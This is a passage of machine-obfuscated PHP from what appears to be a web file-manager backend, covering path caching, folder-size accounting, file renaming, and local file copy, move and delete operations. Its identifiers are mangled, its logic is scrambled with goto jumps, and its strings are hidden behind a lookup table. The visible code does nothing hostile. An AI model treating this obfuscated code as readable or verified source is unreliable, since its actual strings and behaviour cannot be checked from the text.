_get(self::$cachePathInfo, $CØŠƒÕ†²Ô); goto díÑË„·š; C‚®Õ”„ïÔ: $D««…«ëÇÁ = $this->_listDataApplyItem($D««…«ëÇÁ, $d™„¤íŒ…Ó); self::$cachePathInfo[$CØŠƒÕ†²Ô] = $D««…«ëÇÁ; return $D««…«ëÇÁ; goto B¾øß³±¾¬; B¾øß³±¾¬: } public static $cachePathInfoMore = array(); public function pathInfoMore($C”æí§‹¹Õ) { goto bÜÂÃ¦Íë; e©ùŠ“ÚÃ˜: self::$cachePathInfoMore[$C”æí§‹¹Õ] = $aÆÄŸ¯£ä; return $aÆÄŸ¯£ä; goto BëãŸèñİ‹; b»˜êİ¥§æ: $aÆÄŸ¯£ä = $this->pathInfo($C”æí§‹¹Õ); if (!$aÆÄŸ¯£ä) { return !1; } if ($aÆÄŸ¯£ä[$b¾Ö‰Èº»[367]] == $b¾Ö‰Èº»[83]) { $aÆÄŸ¯£ä[$b¾Ö‰Èº»[80]] = $this->folderChildrenNumber($C”æí§‹¹Õ); } goto e©ùŠ“ÚÃ˜; bÜÂÃ¦Íë: $b¾Ö‰Èº» =& $_SERVER[¢à]; $F›Û¼±Ã¿Â = _get(self::$cachePathInfoMore, $C”æí§‹¹Õ); if ($F›Û¼±Ã¿Â) { return $F›Û¼±Ã¿Â; } goto b»˜êİ¥§æ; BëãŸèñİ‹: } public function sourceInfo($eï°”ÜĞù¼) { goto bÉ÷Í½ÃÅ•; bÙÙˆ–·–: $f¾ÕÛÃ÷†® = _get(self::$cacheSourceInfo, $BîÇÌËÙö‰); if ($f¾ÕÛÃ÷†®) { return $f¾ÕÛÃ÷†®; } $B²Ï‹æ£¥à = $this->where(array($D±Áš•øÊ¤[366] => $eï°”ÜĞù¼))->find(); goto aåÄÂÄÕë; bÉ÷Í½ÃÅ•: $D±Áš•øÊ¤ =& $_SERVER[¢à]; if (!$eï°”ÜĞù¼) { return array(); } $BîÇÌËÙö‰ = $D±Áš•øÊ¤[406] . $eï°”ÜĞù¼; goto bÙÙˆ–·–; aåÄÂÄÕë: self::$cacheSourceInfo[$BîÇÌËÙö‰] = $B²Ï‹æ£¥à; return self::$cacheSourceInfo[$BîÇÌËÙö‰]; goto BÔ’Œµ¨æá; BÔ’Œµ¨æá: } public function sourceCacheClear($e•áÜ†ˆÃ» = false) { if ($e•áÜ†ˆÃ» == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¢à][406] . $e•áÜ†ˆÃ»]); } public function pathInfoByPath($BÅùÆŒ­, $eÉèŞ…«©â) { $báŒ‚ëóß =& $_SERVER[¢à]; $e±íøğ×Îí = !$eÉèŞ…«©â ? array() : explode($báŒ‚ëóß[8], trim($eÉèŞ…«©â, $báŒ‚ëóß[8])); $Fë²Ëµº = $BÅùÆŒ­; foreach ($e±íøğ×Îí as $b‡Ã°œîÄ) { $b­í®¼ìÆ = array($báŒ‚ëóß[457] => $Fë²Ëµº, $báŒ‚ëóß[28] => $b‡Ã°œîÄ); $AÑŒ¤¥ó÷Š = $this->where($b­í®¼ìÆ)->select(); if (!$AÑŒ¤¥ó÷Š) { return !1; } $AÑŒ¤¥ó÷Š = array_sort_by($AÑŒ¤¥ó÷Š, $báŒ‚ëóß[393]); $Fë²Ëµº = $AÑŒ¤¥ó÷Š[0][$báŒ‚ëóß[366]]; } return $this->pathInfo($Fë²Ëµº, !0); } protected function updateModifyTime($b˜ÇÂõá½·) { goto CŒ¤¾…ÄÈ; f‚ï™…éŒ: $this->where($Aí†ë›ñĞø)->save($fœØÈë); goto AéÎ¢œãœ; CŒ¤¾…ÄÈ: $D·ìà£õîŸ =& $_SERVER[¢à]; if (!$b˜ÇÂõá½·) { return; } if (!is_array($b˜ÇÂõá½·)) { $b˜ÇÂõá½· = array($b˜ÇÂõá½·); } goto e²«¬ˆÀœÇ; e²«¬ˆÀœÇ: foreach ($b˜ÇÂõá½· as $a“¶ãÉÍÛ¬ => $cƒƒİÊ«—á) { $b˜ÇÂõá½·[$a“¶ãÉÍÛ¬] = intval($cƒƒİÊ«—á); } $Aí†ë›ñĞø = array($D·ìà£õîŸ[366] => array($D·ìà£õîŸ[7], $b˜ÇÂõá½·)); $fœØÈë = array($D·ìà£õîŸ[520] => USER_ID, $D·ìà£õîŸ[387] => time()); goto f‚ï™…éŒ; AéÎ¢œãœ: } public function folderSizeReset($F‘¹ÍÆçìÖ) { goto Dè‡Šå‰ÕŒ; b›óÑî¥Ò—: $dĞËÇ…×ï = array($c®±êİ•¯„[365] => $F‘¹ÍÆçìÖ, $c®±êİ•¯„[392] => 0); $dÑîĞÛàï¯ = $this->where($dĞËÇ…×ï)->sum($c®±êİ•¯„[77]); $dÑîĞÛàï¯ = intval($dÑîĞÛàï¯); goto dÈ ÅÆº¸Ğ; b§—Ï²Šô–: CacheLock::lock($DµéÒá˜ä‹, 20); $this->sourceCacheClear($F‘¹ÍÆçìÖ); $A­–´ÅÃÊ³ = $this->sourceInfo($F‘¹ÍÆçìÖ); goto b›óÑî¥Ò—; Bœƒ÷…Ú‰‚: CacheLock::unlock($DµéÒá˜ä‹); goto a‹£·Çºƒ; Eãë¯Îšøå: $fŠ”¨©Úİ = $this->parentLevelArray($A­–´ÅÃÊ³[$c®±êİ•¯„[455]]); if ($fŠ”¨©Úİ) { $dĞËÇ…×ï = array($c®±êİ•¯„[366] => array($c®±êİ•¯„[381], $fŠ”¨©Úİ)); if ($BÄäİ‡Õ• < 0) { $dĞËÇ…×ï[$c®±êİ•¯„[77]] = array($c®±êİ•¯„[927], abs($BÄäİ‡Õ•)); } $this->where($dĞËÇ…×ï)->setAdd($c®±êİ•¯„[77], $BÄäİ‡Õ•); } $this->targetSpaceUpdate($A­–´ÅÃÊ³[$c®±êİ•¯„[368]], $A­–´ÅÃÊ³[$c®±êİ•¯„[452]]); goto Bœƒ÷…Ú‰‚; dÈ ÅÆº¸Ğ: $BÄäİ‡Õ• = $dÑîĞÛàï¯ - intval($A­–´ÅÃÊ³[$c®±êİ•¯„[77]]); if ($BÄäİ‡Õ• == 0) { return CacheLock::unlock($DµéÒá˜ä‹); } $this->where(array($c®±êİ•¯„[380] => $F‘¹ÍÆçìÖ))->setField($c®±êİ•¯„[77], $dÑîĞÛàï¯); goto Eãë¯Îšøå; Dè‡Šå‰ÕŒ: $c®±êİ•¯„ =& $_SERVER[¢à]; if ($this->statusIgnoreResetSpace) { return; } $DµéÒá˜ä‹ = $c®±êİ•¯„[2317] . $F‘¹ÍÆçìÖ; goto b§—Ï²Šô–; a‹£·Çºƒ: } public function folderSizeResetChildren($BŒÈšÜØÚ) { goto D•ÆÈ•÷İ; bÜğ’‰ÊóÅ: $CïéŠ“ØŸË = array($A©Ø·º“ƒï[514] => 1, $A©Ø·º“ƒï[521] => array($A©Ø·º“ƒï[479], $Céï—ñÂ§[$A©Ø·º“ƒï[455]] . $BŒÈšÜØÚ . $A©Ø·º“ƒï[480])); $c„À¹Û½ = $A©Ø·º“ƒï[2318]; $CöÂ•”ß¢¨ = $this->field($c„À¹Û½)->where($CïéŠ“ØŸË)->select(); goto e…”í‰ëçê; Aë„è‡„Ğ‘: $CöÂ•”ß¢¨[] = $Céï—ñÂ§; $CöÂ•”ß¢¨ = array_to_keyvalue($CöÂ•”ß¢¨, $A©Ø·º“ƒï[366]); foreach ($CöÂ•”ß¢¨ as $aŠ˜É†Í‰Å => $FÛŸ÷öÎ÷) { $CöÂ•”ß¢¨[$aŠ˜É†Í‰Å][$A©Ø·º“ƒï[2319]] = $CöÂ•”ß¢¨[$aŠ˜É†Í‰Å][$A©Ø·º“ƒï[77]]; $CöÂ•”ß¢¨[$aŠ˜É†Í‰Å][$A©Ø·º“ƒï[77]] = 0; } goto a±Úù°–èÄ; e…”í‰ëçê: $CïéŠ“ØŸË[$A©Ø·º“ƒï[367]] = 0; $CØ†½‡Ëë = $this->field($c„À¹Û½)->where($CïéŠ“ØŸË)->select(); if (!$CØ†½‡Ëë) { return; } goto Aë„è‡„Ğ‘; fã›Ï¼½ê¬: foreach ($CöÂ•”ß¢¨ as $FÛŸ÷öÎ÷) { if ($FÛŸ÷öÎ÷[$A©Ø·º“ƒï[77]] == $FÛŸ÷öÎ÷[$A©Ø·º“ƒï[2319]]) { continue; } $AÈòãĞ·š[] = array($A©Ø·º“ƒï[366], $FÛŸ÷öÎ÷[$A©Ø·º“ƒï[366]], $A©Ø·º“ƒï[77], $FÛŸ÷öÎ÷[$A©Ø·º“ƒï[77]]); } $this->saveAll($AÈòãĞ·š); goto cÖäìÖ‰ãÒ; a±Úù°–èÄ: foreach ($CØ†½‡Ëë as $FÛŸ÷öÎ÷) { $b‘»¸ëø­ = $FÛŸ÷öÎ÷[$A©Ø·º“ƒï[457]] . $A©Ø·º“ƒï[33]; if (!isset($CöÂ•”ß¢¨[$b‘»¸ëø­])) { continue; } if ($FÛŸ÷öÎ÷[$A©Ø·º“ƒï[393]] == $CöÂ•”ß¢¨[$b‘»¸ëø­][$A©Ø·º“ƒï[393]]) { $CöÂ•”ß¢¨[$b‘»¸ëø­][$A©Ø·º“ƒï[77]] += $FÛŸ÷öÎ÷[$A©Ø·º“ƒï[77]]; } } foreach ($CöÂ•”ß¢¨ as $FÛŸ÷öÎ÷) { $E¡‰Š×ºˆµ = $this->parentLevelArray($FÛŸ÷öÎ÷[$A©Ø·º“ƒï[455]]); foreach ($E¡‰Š×ºˆµ as $b‘»¸ëø­) { $b‘»¸ëø­ = $b‘»¸ëø­ . $A©Ø·º“ƒï[33]; if (!isset($CöÂ•”ß¢¨[$b‘»¸ëø­])) { continue; } if ($FÛŸ÷öÎ÷[$A©Ø·º“ƒï[393]] == $CöÂ•”ß¢¨[$b‘»¸ëø­][$A©Ø·º“ƒï[393]]) { $CöÂ•”ß¢¨[$b‘»¸ëø­][$A©Ø·º“ƒï[77]] += $FÛŸ÷öÎ÷[$A©Ø·º“ƒï[77]]; } } } $AÈòãĞ·š = array(); goto fã›Ï¼½ê¬; D•ÆÈ•÷İ: $A©Ø·º“ƒï =& $_SERVER[¢à]; $this->sourceCacheClear($BŒÈšÜØÚ); $Céï—ñÂ§ = $this->sourceInfo($BŒÈšÜØÚ); goto bÜğ’‰ÊóÅ; cÖäìÖ‰ãÒ: } public function userSpaceReset($C–Ï‰„ = false) { $Aƒ—Õ‚½‰ê =& $_SERVER[¢à]; $Aò™ƒ­Õíœ = $this->where(array($Aƒ—Õ‚½‰ê[368] => self::TYPE_USER, $Aƒ—Õ‚½‰ê[452] => $C–Ï‰„, $Aƒ—Õ‚½‰ê[367] => 0))->sum($Aƒ—Õ‚½‰ê[77]); Model($Aƒ—Õ‚½‰ê[470])->userEdit($C–Ï‰„, array($Aƒ—Õ‚½‰ê[2061] => $Aò™ƒ­Õíœ)); } public function targetSpaceUpdate($b¿ø‹ê›ÂÂ, $d­£„ÊÎ×) { $D³ÎòÀµ¡Ë =& $_SERVER[¢à]; if (!$d­£„ÊÎ×) { return; } if (!in_array($b¿ø‹ê›ÂÂ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $eŠ¿Œã„à = $this->targetSpaceSize($b¿ø‹ê›ÂÂ, $d­£„ÊÎ×); if ($b¿ø‹ê›ÂÂ == self::TYPE_USER) { Model($D³ÎòÀµ¡Ë[470])->userEdit($d­£„ÊÎ×, array($D³ÎòÀµ¡Ë[2061] => $eŠ¿Œã„à)); } else { if ($b¿ø‹ê›ÂÂ == self::TYPE_GROUP) { Model($D³ÎòÀµ¡Ë[454])->groupEdit($d­£„ÊÎ×, array($D³ÎòÀµ¡Ë[2061] => $eŠ¿Œã„à)); } } } public function targetSpaceSize($dõ…¨Ãˆ©», $a¸îÃË–Ó¿) { goto dÕÍ¨ššµ; F¨Ü¬Ñ–Ï: $B´ÌïÜïì‡ = floatval($CÊåÀ‡Ø¨ó[$CŸ¦ ÙåÊÄ[77]]); $cËùŠ·â¶’ = array($CŸ¦ ÙåÊÄ[521] => array($CŸ¦ ÙåÊÄ[479], $CŸ¦ ÙåÊÄ[466] . $CÊåÀ‡Ø¨ó[$CŸ¦ ÙåÊÄ[366]] . $CŸ¦ ÙåÊÄ[480])); $eÉ‹¬‘¤Ò = Model($CŸ¦ ÙåÊÄ[391])->field($CŸ¦ ÙåÊÄ[380])->where($cËùŠ·â¶’)->select(); goto d¼™íÇ÷çê; d¼™íÇ÷çê: $eÉ‹¬‘¤Ò = array_to_keyvalue($eÉ‹¬‘¤Ò, $CŸ¦ ÙåÊÄ[33], $CŸ¦ ÙåÊÄ[366]); $eÉ‹¬‘¤Ò = array_unique(array_filter($eÉ‹¬‘¤Ò)); if ($eÉ‹¬‘¤Ò) { $cËùŠ·â¶’ = array($CŸ¦ ÙåÊÄ[380] => array($CŸ¦ ÙåÊÄ[381], $eÉ‹¬‘¤Ò)); $B´ÌïÜïì‡ += floatval($this->where($cËùŠ·â¶’)->sum($CŸ¦ ÙåÊÄ[77])); } goto EÍãß»á„¡; dÕÍ¨ššµ: $CŸ¦ ÙåÊÄ =& $_SERVER[¢à]; $CÊåÀ‡Ø¨ó = $this->sourceRoot($dõ…¨Ãˆ©», $a¸îÃË–Ó¿, !0); if (!$CÊåÀ‡Ø¨ó) { return 0; } goto F¨Ü¬Ñ–Ï; EÍãß»á„¡: return $B´ÌïÜïì‡; goto d±¬ÌğÃŞÂ; d±¬ÌğÃŞÂ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($CŸË‰ÂÖÇä) { return $this->fileTypeProfile($CŸË‰ÂÖÇä, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eµóÖ”Ûù) { return $this->fileTypeProfile($eµóÖ”Ûù, SourceModel::TYPE_GROUP); } private function fileTypeProfile($A¶ƒóíĞ³Â, $dôß’Ôõ¼¸) { goto C™ÆŸ“‚ª²; C™ÆŸ“‚ª²: $f¢îÜÉÛê‚ =& $_SERVER[¢à]; $a‘ÊŒ–ÁÄ¨ = $f¢îÜÉÛê‚[2320] . $A¶ƒóíĞ³Â . $f¢îÜÉÛê‚[70] . $dôß’Ôõ¼¸; $a©ªí¹Œ¾ = Cache::get($a‘ÊŒ–ÁÄ¨); goto B¸¡Ê„çÀ; B¸¡Ê„çÀ: if ($a©ªí¹Œ¾) { return $a©ªí¹Œ¾; } $Ešù³ñ¢«ä = array($f¢îÜÉÛê‚[514] => 0); if ($A¶ƒóíĞ³Â != !1) { $Ešù³ñ¢«ä[$f¢îÜÉÛê‚[452]] = $A¶ƒóíĞ³Â; $Ešù³ñ¢«ä[$f¢îÜÉÛê‚[368]] = $dôß’Ôõ¼¸; } goto AØÎƒ‰¸ùÃ; AØÎƒ‰¸ùÃ: $c¥·õ¼ß‰ = array(); $c¥·õ¼ß‰[$f¢îÜÉÛê‚[2321]] = array($f¢îÜÉÛê‚[2322] => LNG($f¢îÜÉÛê‚[2321]), $f¢îÜÉÛê‚[2323] => $this->where($Ešù³ñ¢«ä)->count(), $f¢îÜÉÛê‚[516] => $this->where($Ešù³ñ¢«ä)->sum($f¢îÜÉÛê‚[77])); $eÑßÆÜÛ¾ = KodIO::fileTypeList(); goto d³ù‚ğã¯£; d³ù‚ğã¯£: foreach ($eÑßÆÜÛ¾ as $Bâ¢ÚôµôŒ => $E£æÆ¯ååĞ) { $Ešù³ñ¢«ä[$f¢îÜÉÛê‚[369]] = $this->fileTypeWhere($Bâ¢ÚôµôŒ); $c¥·õ¼ß‰[$Bâ¢ÚôµôŒ] = array($f¢îÜÉÛê‚[2322] => $E£æÆ¯ååĞ[$f¢îÜÉÛê‚[28]], $f¢îÜÉÛê‚[2323] => $this->where($Ešù³ñ¢«ä)->count(), $f¢îÜÉÛê‚[516] => $this->where($Ešù³ñ¢«ä)->sum($f¢îÜÉÛê‚[77])); } Cache::set($a‘ÊŒ–ÁÄ¨, $c¥·õ¼ß‰, 1200); return $c¥·õ¼ß‰; goto bö‰¼½ĞˆÛ; bö‰¼½ĞˆÛ: } public function fileNameExist($FÓ›–„©†, $fÀğŠ¡ª—£) { $BÎ®ÆÛ¶® =& $_SERVER[¢à]; $b§Ş‰˜Äö­ = $this->childList($FÓ›–„©†); foreach ($b§Ş‰˜Äö­ as $BÇâ×ì®Ú) { if ($BÇâ×ì®Ú[$BÎ®ÆÛ¶®[28]] == $fÀğŠ¡ª—£) { return $BÇâ×ì®Ú[$BÎ®ÆÛ¶®[366]]; } } return !1; } public function childList($b—«¹¿­‡Ù) { goto båäÙšµİ…; BØÏ°´ÌÛ: self::$cacheChildList[$fßÌ‚Óê’§] = $BİÉòÚ‚ò; foreach ($BİÉòÚ‚ò as $D³õá¹À‚¿) { $fßÌ‚Óê’§ = $C‡”ï‚£µ[406] . $D³õá¹À‚¿[$C‡”ï‚£µ[366]]; self::$cacheSourceInfo[$fßÌ‚Óê’§] = $D³õá¹À‚¿; } return $BİÉòÚ‚ò; goto DË²‹¼‹®; dæ¥Ñ²ÖÜš: $E¢ä¤Ç¹ = array($C‡”ï‚£µ[457] => intval($b—«¹¿­‡Ù), $C‡”ï‚£µ[393] => 0); $BİÉòÚ‚ò = $this->where($E¢ä¤Ç¹)->select(); $BİÉòÚ‚ò = $BİÉòÚ‚ò ? $BİÉòÚ‚ò : array(); goto BØÏ°´ÌÛ; båäÙšµİ…: $C‡”ï‚£µ =& $_SERVER[¢à]; $fßÌ‚Óê’§ = $C‡”ï‚£µ[2301] . $b—«¹¿­‡Ù; if (isset(self::$cacheChildList[$fßÌ‚Óê’§])) { return self::$cacheChildList[$fßÌ‚Óê’§]; } goto dæ¥Ñ²ÖÜš; DË²‹¼‹®: } public function fileNameAuto($a¢–”Ë‹¶, $bØ¨Œ‘ÁİÀ, $b‹ñæ™©Ê© = REPEAT_RENAME, $FË¤ß×¦­ = false) { $BöÊÊË–šÚ =& $_SERVER[¢à]; $A´•„à›ºç = $this->childList($a¢–”Ë‹¶); $A¶óÂ÷ÖÌ¦ = array_to_keyvalue($A´•„à›ºç, $BöÊÊË–šÚ[33], $BöÊÊË–šÚ[28]); return $this->fileNameAutoGet($A¶óÂ÷ÖÌ¦, $bØ¨Œ‘ÁİÀ, $b‹ñæ™©Ê©, $FË¤ß×¦­); } public function fileNameAutoGet($cˆ¨×Õ¶Ê©, $b¼Ñ¶÷ÃÂæ, $b¬‹åÊÔ, $E’æ‚âä”) { $aÊ—ôŞö¦ =& $_SERVER[¢à]; if ($b¬‹åÊÔ == REPEAT_REPLACE || !$cˆ¨×Õ¶Ê© || !in_array_not_case($b¼Ñ¶÷ÃÂæ, $cˆ¨×Õ¶Ê©) || $E’æ‚âä” && $b¬‹åÊÔ != REPEAT_RENAME_FOLDER) { return $b¼Ñ¶÷ÃÂæ; } if ($b¬‹åÊÔ == REPEAT_SKIP) { return !1; } $b¿ÌÀ¹Œ‹— = $aÊ—ôŞö¦[93] . get_path_ext($b¼Ñ¶÷ÃÂæ); $b¿ÌÀ¹Œ‹— = $b¿ÌÀ¹Œ‹— == $aÊ—ôŞö¦[93] || $E’æ‚âä” ? $aÊ—ôŞö¦[33] : $b¿ÌÀ¹Œ‹—; for ($D‰÷ˆ½„Ç¿ = 1; $D‰÷ˆ½„Ç¿ <= count($cˆ¨×Õ¶Ê©) + 1; $D‰÷ˆ½„Ç¿++) { $cœ—Ñ–óÁ× = substr($b¼Ñ¶÷ÃÂæ, 0, strlen($b¼Ñ¶÷ÃÂæ) - strlen($b¿ÌÀ¹Œ‹—)); $b¸¶‚ìƒ‰æ = $cœ—Ñ–óÁ× . "\50{$D‰÷ˆ½„Ç¿}\51{$b¿ÌÀ¹Œ‹—}"; if (!in_array_not_case($b¸¶‚ìƒ‰æ, $cˆ¨×Õ¶Ê©)) { return $b¸¶‚ìƒ‰æ; } } } } goto bĞÁÖ‘ÓŠõ; BÄÅÛ†âğ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($b·Œ³Ó˜¥Ñ) { if (substr($b·Œ³Ó˜¥Ñ, 0, 2) == $_SERVER[¢à][1144]) { $b·Œ³Ó˜¥Ñ = BASIC_PATH . substr($b·Œ³Ó˜¥Ñ, 2); } return $b·Œ³Ó˜¥Ñ; } public function iconvApp($C²”÷Ÿ¯£ô) { $eáò¸ˆÆäœ =& $_SERVER[¢à]; global $config; return $this->iconvTo($C²”÷Ÿ¯£ô, $config[$eáò¸ˆÆäœ[1142]], $config[$eáò¸ˆÆäœ[1141]]); } public function iconvSystem($fœÅëŞË´) { $b§ÙÅñŞ¶˜ =& $_SERVER[¢à]; global $config; return $this->iconvTo($fœÅëŞË´, $config[$b§ÙÅñŞ¶˜[1141]], $config[$b§ÙÅñŞ¶˜[1142]]); } public function getPathOuter($dƒ²‡¯æ°ï) { goto Bé™ï…¥•›; Bé™ï…¥•›: $Bºï‘ÁÄå =& $_SERVER[¢à]; $C¡Ÿø‚ì­ = $this->iconvApp($this->pathBase); $dƒ²‡¯æ°ï = $this->iconvApp($dƒ²‡¯æ°ï); goto a¡”Ù¨§£»; a¡”Ù¨§£»: if (substr($C¡Ÿø‚ì­, 0, 2) == $Bºï‘ÁÄå[1144]) { $C¡Ÿø‚ì­ = BASIC_PATH . substr($C¡Ÿø‚ì­, 2); } if (substr($dƒ²‡¯æ°ï, 0, 2) == $Bºï‘ÁÄå[1144]) { $dƒ²‡¯æ°ï = BASIC_PATH . substr($dƒ²‡¯æ°ï, 2); } $C¡Ÿø‚ì­ = KodIO::clear($C¡Ÿø‚ì­); goto eÒìëÒ“¨†; E Ö‘¤¶®ª: return $this->pathDriver . $Bºï‘ÁÄå[8] . ltrim($dƒ²‡¯æ°ï, $Bºï‘ÁÄå[8]); goto CòĞ¿Š³™ñ; eÒìëÒ“¨†: $dƒ²‡¯æ°ï = KodIO::clear($dƒ²‡¯æ°ï); $dƒ²‡¯æ°ï = substr($dƒ²‡¯æ°ï, strlen($C¡Ÿø‚ì­)); if (empty($this->pathDriver)) { return $dƒ²‡¯æ°ï; } goto E Ö‘¤¶®ª; CòĞ¿Š³™ñ: } public function mkfile($dùÏ¶ÉÑµŒ, $B‰½Äæ…§ = '', $dš×˜¼÷¢¿ = REPEAT_RENAME) { $dùÏ¶ÉÑµŒ = $this->iconvSystem($dùÏ¶ÉÑµŒ); @touch($dùÏ¶ÉÑµŒ); if ($B‰½Äæ…§) { file_put_contents($dùÏ¶ÉÑµŒ, $B‰½Äæ…§); } return is_file($dùÏ¶ÉÑµŒ) ? $this->getPathOuter($dùÏ¶ÉÑµŒ) : !1; } public function mkdir($B´è‹”÷èÃ, $cÍÄá–¶½é = REPEAT_SKIP) { $B´è‹”÷èÃ = $this->iconvSystem($B´è‹”÷èÃ); if (is_dir($B´è‹”÷èÃ)) { return $this->getPathOuter($B´è‹”÷èÃ); } @mkdir($B´è‹”÷èÃ, 511, !0); return is_dir($B´è‹”÷èÃ) ? $this->getPathOuter($B´è‹”÷èÃ) : !1; } public function copyFile($a‹—±ğ¼ä†, $CÉ¡ŸŞ‚ê) { $this->mkdir($this->pathFather($CÉ¡ŸŞ‚ê)); $a‹—±ğ¼ä† = $this->iconvSystem($a‹—±ğ¼ä†); $CÉ¡ŸŞ‚ê = $this->iconvSystem($CÉ¡ŸŞ‚ê); $cß ìÑÊŸŞ = @copy($a‹—±ğ¼ä†, $CÉ¡ŸŞ‚ê); return $cß ìÑÊŸŞ ? $this->getPathOuter($CÉ¡ŸŞ‚ê) : !1; } public function moveFile($B‹‹ïƒÍ°Œ, $B’ÎòƒÆÊŸ) { $this->mkdir($this->pathFather($B’ÎòƒÆÊŸ)); $B‹‹ïƒÍ°Œ = $this->iconvSystem($B‹‹ïƒÍ°Œ); $B’ÎòƒÆÊŸ = $this->iconvSystem($B’ÎòƒÆÊŸ); $fâÆœ¥Æá– = intval(@rename($B‹‹ïƒÍ°Œ, $B’ÎòƒÆÊŸ)); if (!$fâÆœ¥Æá–) { if ($fâÆœ¥Æá– = intval(@copy($B‹‹ïƒÍ°Œ, $B’ÎòƒÆÊŸ))) { @unlink($B‹‹ïƒÍ°Œ); } } return $fâÆœ¥Æá– ? $this->getPathOuter($B’ÎòƒÆÊŸ) : !1; } public function delFile($AÂƒç³¶ƒ) { $AÂƒç³¶ƒ = $this->iconvSystem($AÂƒç³¶ƒ); if (!@unlink($AÂƒç³¶ƒ)) { @chmod($AÂƒç³¶ƒ, 511); if (!@unlink($AÂƒç³¶ƒ)) { return !1; } } else { return !0; } } public function delFolder($bÊÍæå²Ÿ„) { goto Eö§¿”›¶‹; f¦Á½¤ •‡: return rmdir($bÊÍæå²Ÿ„); goto d°‚Š‚õ”; E™‡ã­ˆ‹ö: if (!($AĞê‚£óóÄ = opendir($bÊÍæå²Ÿ„))) { return !1; } while (($cÁ†–°¸’ = readdir($AĞê‚£óóÄ)) !== !1) { if ($cÁ†–°¸’ == $EÏ¾Òõó÷¦[93] || $cÁ†–°¸’ == $EÏ¾Òõó÷¦[1154]) { continue; } $EË‰˜…ñê£ = $bÊÍæå²Ÿ„ . $EÏ¾Òõó÷¦[8] . $cÁ†–°¸’; if (!is_dir($EË‰˜…ñê£)) { if (!unlink($EË‰˜…ñê£)) { chmod($EË‰˜…ñê£, 511); if (!unlink($EË‰˜…ñê£)) { return !1; } } } else { chmod($EË‰˜…ñê£, 511); $EË‰˜…ñê£ = $this->iconvApp($EË‰˜…ñê£); if (!$this->delFolder($EË‰˜…ñê£)) { return !1; } } } closedir($AĞê‚£óóÄ); goto f¦Á½¤ •‡; Eö§¿”›¶‹: $EÏ¾Òõó÷¦ =& $_SERVER[¢à]; $bÊÍæå²Ÿ„ = $this->iconvSystem($bÊÍæå²Ÿ„); if (!is_dir($bÊÍæå²Ÿ„)) { return !0; } goto E™‡ã­ˆ‹ö; d°‚Š‚õ”: } public function rename($cŞÓ¬”°ñë, $d»ßˆßñ’›) { goto dä™˜ÒöÊï; DÉ‡èÁ­ºÕ: $cŞÓ¬”°ñë = $this->iconvSystem($cŞÓ¬”°ñë); $eóÜÄ“‡¾Ä = $this->pathFather($cŞÓ¬”°ñë); $d‘ÍÁßœ¶± = rtrim($eóÜÄ“‡¾Ä, $f¿â”·›˜İ[8]) . $f¿â”·›˜İ[8] . $eøËÇê‚•À; goto DØ¥ì—ˆ”­; dä™˜ÒöÊï: $f¿â”·›˜İ =& $_SERVER[¢à]; $eøËÇê‚•À = $this->fileNameAuto($this->pathFather($cŞÓ¬”°ñë), $d»ßˆßñ’›); $eøËÇê‚•À = $this->iconvSystem($eøËÇê‚•À); goto DÉ‡èÁ­ºÕ; DØ¥ì—ˆ”­: $e²Şù¢ÖÉø = @rename($cŞÓ¬”°ñë, $d‘ÍÁßœ¶±); $d‘ÍÁßœ¶± = $this->iconvApp($d‘ÍÁßœ¶±); return $e²Şù¢ÖÉø ? $this->getPathOuter($d‘ÍÁßœ¶±) : !1; goto e–Ğ‰àŸ¢á; e–Ğ‰àŸ¢á: } public function size($Eó°ˆ‚ÁÕ) { $Eó°ˆ‚ÁÕ = $this->iconvSystem($Eó°ˆ‚ÁÕ); return (double) abs(sprintf($_SERVER[¢à][1156], @filesize($Eó°ˆ‚ÁÕ))); } public function info($eÆœÇõè¼¥) { $eÆœÇõè¼¥ = $this->iconvSystem($eÆœÇõè¼¥); if ($this->isFolder($eÆœÇõè¼¥)) { return $this->folderInfo($eÆœÇõè¼¥); } else { if ($this->isFile($eÆœÇõè¼¥)) { return $this->fileInfo($eÆœÇõè¼¥); } } return !1; } protected function infoChildren($F£Í£¡¾¥š, &$fÜ½èßÈòÚ, $B«„éß¦Œ = true) { $cå¸ñÍÜ…” =& $_SERVER[¢à]; $F£Í£¡¾¥š = rtrim($F£Í£¡¾¥š, $cå¸ñÍÜ…”[8]) . $cå¸ñÍÜ…”[8]; if ($B«„éß¦Œ) { check_abort(); $F£Í£¡¾¥š = $this->iconvSystem($F£Í£¡¾¥š); } if (!($f—‚’µêğ = @opendir($F£Í£¡¾¥š))) { return; } while (($eœ‡ñŠ´Å° = readdir($f—‚’µêğ)) !== !1) { if ($eœ‡ñŠ´Å° == $cå¸ñÍÜ…”[93] || $eœ‡ñŠ´Å° == $cå¸ñÍÜ…”[1154]) { continue; } $A×¿òµ§àÒ = $F£Í£¡¾¥š . $eœ‡ñŠ´Å°; if (is_file($A×¿òµ§àÒ)) { $fÜ½èßÈòÚ[$cå¸ñÍÜ…”[78]]++; $fÜ½èßÈòÚ[$cå¸ñÍÜ…”[77]] += (double) abs(sprintf($cå¸ñÍÜ…”[1156], @filesize($A×¿òµ§àÒ))); } else { $fÜ½èßÈòÚ[$cå¸ñÍÜ…”[79]]++; $this->infoChildren($A×¿òµ§àÒ, $fÜ½èßÈòÚ, !1); } } closedir($f—‚’µêğ); } private function folderInfo($EÌİá†ØÎ, $EÛ«ÂŞóÔ = false) { $F×ÅËª‹Êğ =& $_SERVER[¢à]; $EÌİá†ØÎ = rtrim($EÌİá†ØÎ, $F×ÅËª‹Êğ[8]) . $F×ÅËª‹Êğ[8]; $bæ†¶ëà¥Â = $this->iconvApp($this->pathThis($EÌİá†ØÎ)); if ($EÛ«ÂŞóÔ) { return array($F×ÅËª‹Êğ[28] => $bæ†¶ëà¥Â, $F×ÅËª‹Êğ[75] => $this->getPathOuter($EÌİá†ØÎ), $F×ÅËª‹Êğ[29] => $F×ÅËª‹Êğ[76]); } $b•åâ¢‘ = array($F×ÅËª‹Êğ[28] => $bæ†¶ëà¥Â, $F×ÅËª‹Êğ[75] => $this->getPathOuter($EÌİá†ØÎ), $F×ÅËª‹Êğ[29] => $F×ÅËª‹Êğ[76], $F×ÅËª‹Êğ[184] => @filectime($EÌİá†ØÎ), $F×ÅËª‹Êğ[107] => 